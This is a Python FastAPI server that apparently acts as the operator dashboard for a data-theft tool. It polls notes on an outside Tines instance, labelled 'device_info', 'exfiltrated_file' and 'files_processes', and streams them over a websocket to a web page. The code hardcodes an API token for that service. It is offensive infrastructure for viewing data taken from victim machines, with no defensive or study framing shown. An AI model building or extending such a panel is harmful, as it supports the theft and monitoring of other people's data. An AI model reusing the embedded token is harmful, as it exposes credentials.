from fastapi import FastAPI, WebSocket
from fastapi.responses import FileResponse
from fastapi.staticfiles import StaticFiles
from fastapi import WebSocket, WebSocketDisconnect
import requests
import asyncio
import json

app = FastAPI()

app.mount("/files", StaticFiles(directory="files"), name="files")
app.mount("/style", StaticFiles(directory="style"), name="style")
app.mount("/script", StaticFiles(directory="script"), name="script")

@app.get("/dashboard")
def serve_dashboard():
    return FileResponse("index.html")

async def fetch_data():
    device_info_url = "https://frosty-brook-8666.tines.com/api/v1/notes/54207"
    exfiltrated_file_url = "https://frosty-brook-8666.tines.com/api/v1/notes/54208"
    others_url = "https://frosty-brook-8666.tines.com/api/v1/notes/54211"
    
    headers = {"x-user-token": "DuEEDWvDoUjnQUJcahPw"}
    
    while True:
        device_info_response = requests.get(device_info_url, headers=headers)
        exfiltrated_file_response = requests.get(exfiltrated_file_url, headers=headers)
        others_response = requests.get(others_url, headers=headers)

        device_info_json = device_info_response.json() if device_info_response.status_code == 200 else {}
        exfiltrated_file_json = exfiltrated_file_response.json() if exfiltrated_file_response.status_code == 200 else {}
        others_json = others_response.json() if others_response.status_code == 200 else {}

        device_info = device_info_json.get("content", "Error fetching data")
        exfiltrated_file = exfiltrated_file_json.get("content", "Error fetching data")
        others_file = others_json.get("content", "Error fetching data")

        yield {
            "device_info": device_info,
            "exfiltrated_file": exfiltrated_file,
            "files_processes": others_file
        }
        await asyncio.sleep(5)

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    try:
        async for data in fetch_data():
            try:
                device_info = json.loads(data["device_info"]) if isinstance(data["device_info"], str) and data["device_info"].startswith("{") else data["device_info"]
                exfiltrated_file = json.loads(data["exfiltrated_file"]) if isinstance(data["exfiltrated_file"], str) and data["exfiltrated_file"].startswith("{") else data["exfiltrated_file"]
                files_processes = json.loads(data["files_processes"]) if isinstance(data["files_processes"], str) and data["files_processes"].startswith("{") else data["files_processes"]
                
                await websocket.send_text(json.dumps({
                    "device_info": device_info,
                    "exfiltrated_file": exfiltrated_file,
                    "files_processes": files_processes
                }))
            except json.JSONDecodeError as e:
                print(f"[!] JSON parsing error: {e}")
                await websocket.send_text(json.dumps(data))
    except WebSocketDisconnect:
        print("[!] WebSocket disconnected: Client closed the connection")
    except Exception as e:
        print(f"[!] Unexpected error in WebSocket: {e}")
    finally:
        print("[!] WebSocket connection closed")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=5000)
